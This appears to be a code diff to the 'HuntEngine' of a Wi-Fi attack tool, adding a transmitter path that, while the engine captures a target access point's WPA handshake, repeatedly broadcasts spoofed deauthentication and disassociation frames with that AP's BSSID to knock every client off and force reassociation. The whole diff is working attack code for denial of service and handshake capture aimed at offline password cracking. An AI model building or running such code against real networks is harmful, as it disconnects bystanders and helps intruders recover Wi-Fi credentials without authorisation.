@@ -16,10 +16,12 @@ constexpr uint8_t kNoTarget[6] = {0, 0, 0, 0, 0, 0};
 }  // namespace
 
 HuntEngine::HuntEngine(RadioSniffer& sniffer, ApRegistry& registry, CaptureReadyObserver& observer,
-                       const uint8_t* channels, size_t channelCount, const HuntConfig& config)
+                       const uint8_t* channels, size_t channelCount, const HuntConfig& config,
+                       RawTransmitter* transmitter)
     : sniffer_(sniffer),
       registry_(registry),
       observer_(observer),
+      transmitter_(transmitter),
       collector_(kNoTarget, 0),
       handshakeConsumer_(collector_),
       hopper_(channels, channelCount, config.dwellMs),
@@ -76,6 +78,7 @@ void HuntEngine::doStartCapturing(uint32_t nowMs) {
             activeSink_.store(&handshakeConsumer_, std::memory_order_release);
             phase_ = Phase::Capturing;
             phaseDeadlineMs_ = nowMs + config_.captureWindowMs;
+            deauthDueMs_ = nowMs;  // armed: fire the first deauth burst on the first Capturing tick.
             return;
         }
         ++targetIndex_;  // radio rejected this target's channel — skip it, never capture off-channel.
@@ -110,9 +113,11 @@ void HuntEngine::tick(uint32_t nowMs) {
 
         case Phase::Capturing: {
             if (collector_.isWpaSecValid()) {
-                enterQuiesce(nowMs, Resume::ReportThenAdvance);
+                enterQuiesce(nowMs, Resume::ReportThenAdvance);  // captured: stop deauthing, report.
             } else if (reached(nowMs, phaseDeadlineMs_)) {
                 enterQuiesce(nowMs, Resume::AdvanceNoReport);
+            } else {
+                maybeTransmitDeauth(nowMs);  // still capturing this target: force reassociation (armed).
             }
             return;
         }
@@ -154,6 +159,28 @@ void HuntEngine::onFrame(const uint8_t* frame, uint16_t len) {
 const uint8_t* HuntEngine::capturingBssid() const {
     if (phase_ != Phase::Capturing) return nullptr;
     return collector_.handshake().bssid;
+}
+
+void HuntEngine::maybeTransmitDeauth(uint32_t nowMs) {
+    if (transmitter_ == nullptr) return;            // disarmed: passive hunt, transmit nothing (#16).
+    if (!reached(nowMs, deauthDueMs_)) return;      // within the cadence gap — let the client reassociate.
+    // Reached only from the Capturing branch, so the collector's target IS the parked AP: source and
+    // BSSID = capturingBssid(), destination = broadcast (every client of that AP at once, no scanner).
+    const uint8_t* bssid = collector_.handshake().bssid;
+    transmitDeauthFrame(ManagementSubtype::Deauth, bssid);
+    transmitDeauthFrame(ManagementSubtype::Disassoc, bssid);
+    deauthDueMs_ = nowMs + config_.deauthIntervalMs;
+}
+
+void HuntEngine::transmitDeauthFrame(ManagementSubtype subtype, const uint8_t bssid[6]) {
+    uint8_t frame[kDeauthFrameLen];
+    const size_t len = buildDeauthFrame(frame, sizeof(frame), subtype, kBroadcastMac, bssid,
+                                        DeauthReason::Class3FrameFromNonassoc);
+    if (transmitter_->transmit(frame, static_cast<uint16_t>(len))) {
+        ++deauthTxOk_;
+    } else {
+        ++deauthTxFail_;
+    }
 }
 
 }  // namespace sapper
